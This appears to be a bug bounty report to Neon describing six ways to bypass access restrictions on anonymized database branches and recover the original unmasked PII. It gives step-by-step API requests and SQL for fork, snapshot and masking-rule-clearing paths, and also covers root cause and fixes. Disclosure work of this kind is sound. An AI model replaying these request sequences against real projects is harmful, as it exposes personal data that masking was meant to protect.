title: Anonymized branch restricted_actions bypass — full raw pre-anonymization data recoverable via fork / snapshot / rule-clear re-anonymize (6 paths)

Asset: https://console-stage.neon.build

Severity: HIGH

Weakness: CWE-284 Improper Access Control

## Summary:
Neon's Anonymized Branch (static masking) marks branches with `restricted_actions` — `restore`, `delete-rw-endpoint`, `connect-to-endpoints` — and the docs state: "Currently cannot reset to parent, restore, or delete the read-write endpoint for anonymized branches." `restore`/`reset_to_parent` ARE enforced (422) and the data plane is gated (57P03) while anonymization is pending.

The enforcement list misses the operations that are semantically equivalent to restore — and forking the anonymized branch is the vendor's own documented **main workflow** for this feature (blog 2025-05-15: "the anon branch behaves just like any other Neon branch... You can branch off of it instantly"; docs: anonymized branches "permanently replace PII"; re-runs apply "to previously anonymized data, not fresh data from the parent branch"). Verified on staging: fork (incl. PITR params), snapshot create+restore, and rule-clear + re-anonymize all succeed on restricted branches and expose the **full original rows** — 6 reachable paths:

1. **PITR fork** of a fully anonymized branch to its leaked creation `parent_lsn` → raw data (verified 10s and 180s after completion; `parent_timestamp` also works).
2. **Failed job**: `masking_function` that fails only at runtime (`anon.no_such_fn()`) → branch stuck in `state=error`, data fully raw, data plane permanently disabled, lock kept → plain fork of current state → raw data.
3. **Never started**: `start_anonymization: false` → `initialized` state, raw data → plain fork → raw data.
4. **Ghost branch**: column-name validation runs AFTER branch creation → HTTP 400 but the branch persists (initialized, raw, locked, orphaned; infinitely repeatable).
5. **Snapshot lifecycle**: on a failed/initialized/ghost branch, snapshot create → 200 and snapshot restore → 200 → unrestricted child with raw rows (restore semantics are explicitly forbidden by `restricted_actions`, but the snapshot channel is ungated; snapshot outlives the branch).
6. **Rule-clear + re-anonymize**: `PATCH masking_rules` `{"masking_rules": []}` → 200 (ungated) → `POST /anonymize` → 200 → `state=anonymized` ("no masking rules defined") → `connect-to-endpoints` auto-released → the SAME branch serves raw rows directly (lock release is state-machine-driven, not data-driven; zero artifacts).

Negative control on a fully masked branch: nothing recoverable (rows overwritten; `restore`/`reset_to_parent` stay 422) — exposure = pre-completion states (initialized/error/ghost) + PITR, all stable (no race window).

## Steps To Reproduce:
Own project `orange-sun-90493739` on console-stage.neon.build, header `X-Bug-Bounty: xxbo` on every request.

**1) Seed source branch `br-src`:**
```sql
create table u_pii(id int, email text, secret text);
insert into u_pii values (1,'alice.real@victimcorp.com','ssn-111-22-3333');
```

**2) Create anonymized branch (owner op)** — 201, carries `restricted_actions`, and leaks `parent_lsn` (= fork point from source = before the masking UPDATE):
```http
POST /api/v2/projects/{pid}/branch_anonymized
{"branch_create":{"branch":{"name":"anon-br","parent_id":"<br-src>"},"endpoints":[{"type":"read_write"}]},
 "masking_rules":[{"database_name":"neondb","schema_name":"public","table_name":"u_pii","column_name":"email","masking_function":"anon.fake_email()"}],
 "start_anonymization":true}
```
Control: `POST /branches/{anon-br}/reset_to_parent` → **422** "cannot restore anonymized branches" (enforcement exists).

**3) Path 1 — PITR fork (no race, any time after completion):**
```http
POST /api/v2/projects/{pid}/branches
{"branch":{"name":"fork-back","parent_id":"<anon-br>","parent_lsn":"0/3417598"},"endpoints":[{"type":"read_write"}]}
→ 201, restricted_actions: null
```
```sql
select * from u_pii;  -- alice.real@victimcorp.com / ssn-111-22-3333  (full original rows)
```

**4) Paths 2–4 — no fork parameters at all:**
```http
POST .../branch_anonymized    # "masking_function":"anon.no_such_fn()"
→ 201; ~10s later state=error (data raw, 57P03, lock kept)
```
Same raw-locked branch for `start_anonymization:false` (initialized) and for a non-existent `column_name` (HTTP 400 **but the branch persists** — ghost, u11-failcol).
Then a plain fork (no params) of that branch → 201, `restricted_actions: null` → raw rows readable.

**5) Paths 5/6 — no fork at all:**
```http
# path 5 (on the failed/initialized branch, raw data)
POST /projects/{pid}/branches/{failed-br}/snapshot?name=s      → 200
POST /projects/{pid}/snapshots/{sid}/restore                   → 200 → new branch, ra=null, raw rows

# path 6 (on an initialized branch, raw data, 57P03)
PATCH /projects/{pid}/branches/{init-br}/masking_rules
{"masking_rules": []}                                          → 200 (NOT gated)
POST /projects/{pid}/branches/{init-br}/anonymize              → 200
# status → state=anonymized "Anonymization completed successfully (no masking rules defined)"
# connect-to-endpoints auto-released → SAME branch data plane serves raw rows directly
```

## Impact:
- Vendor-declared invariants "cannot restore anonymized branches" and "permanently replace PII" are bypassed through the documented main workflow (fork) plus ungated snapshot/state-machine channels — CWE-284, a systemic multi-endpoint gap (single-endpoint fixes remain bypassable).
- Full original data (masked AND unmasked columns) recoverable from any anonymized branch for its whole lifetime; paths 2–6 are stable states (no race); path 4 is endlessly repeatable (each 400 request leaks another orphan branch).
- Path 6 is the stealthiest: in-place data-plane unlock with zero child-branch artifacts; combined with ghost branches an attacker can mass-produce and drain raw-data branches without leaving new resources.
- Vendor-published use case "Contractor or partner access. Share a branch... without giving access to actual user data" → a low-trust member with fork/mutation rights on the shared project recovers raw PII; masking and compliance controls (data minimization, GDPR) fail in the feature's primary scenario.
- HIGH: the feature's documented purpose is sharing data copies with low-trust parties — vendor blog use case "Contractor or partner access... without giving access to actual user data", and the per-project permission model hides even connection strings from Viewer — so a fork-capable member recovers raw PII the vendor promised would stay masked; the data owner's data is exposed to a party with no production access rights. (Role floor Viewer vs Editor unverifiable on single-user staging — `permission: viewer` scoped keys are NOT enforced on the staging API layer; disclosed to triage.)
- Not claimed: cross-tenant access, production-tenant compromise.

## Root cause:
1. `restricted_actions` is enforced only on reset/restore/endpoint-delete (422) and data-plane connections (57P03); branch fork (incl. PITR params), snapshot create/restore, `PATCH masking_rules`, `POST /anonymize` and `set_as_default` are not in the list.
2. Forked/restored children do not inherit `restricted_actions` (child response `restricted_actions: null`).
3. `branch_anonymized` is not atomic: validation runs after branch creation → HTTP 400 still leaves a created, initialized, locked orphan branch.
4. The data-plane lock is released on job state (`anonymized`), not on masking evidence → an empty-rule job unlocks raw data in place.

## Suggested fix:
1. Gate fork on restricted parents: reject `parent_lsn`/`parent_timestamp` earlier than the anonymization-completion LSN (or reject PITR params entirely); reject forking branches in error/initialized/anonymizing states; make children inherit `restricted_actions`.
2. Apply the same checks to snapshot create/restore on restricted branches.
3. Give failed anonymization jobs a terminal state (auto-delete or safe retry); make branch creation atomic (rollback on validation failure).
4. Gate `PATCH masking_rules` and `POST /anonymize` while restricted; release the data plane only on masking evidence (non-empty rule set, rows affected > 0), not on the state machine alone.
5. Audit every timeline/state-changing endpoint (restore, reset, fork, import, snapshot create/restore, masking-rules PATCH, anonymize, set_as_default) against the `restricted_actions` list.

## Impact:
HIGH (security-function bypass + raw PII recovery in the vendor-documented low-trust sharing scenario; systemic 6-path gap → single-endpoint fixes remain bypassable). All tests on own project with self-generated dummy data; every branch deleted immediately after the test; project `main` untouched; zero destructive operations; `X-Bug-Bounty: xxbo` on all requests.

## Attachments:
- Evidence scripts/outputs on request: `_u8_forkpitr.py/_u8_out.txt` (PITR fork, path 1), `_u9_forkconfirm.py/_u9_out.txt` (180s time-independence), `_u6_anon_chain.py/_u6_out.txt` (restore/reset 422 control), `_u11_failstate.py/_u11_out.txt` (failed states, path 2), `_u12_forkfailed.py/_u12_out.txt` (raw data from fork of failed branch), `_u14_anon_state.py/_u14_out.txt` (initialized state machine, path 3), `_u15_ghost.py/_u15_out.txt` (ghost branch, path 4), `_u16_derived.py/_u16_out.txt` (paths 5/6: snapshot RAW=True; rule-clear unlock RAW=True), `_u16b_restore.py/_u16b_out.txt` (control: restore endpoint 422-gated), `_u17c_scopecheck.py/_u17c_out.txt` (viewer-scope enforcement probe, not enforced on staging).
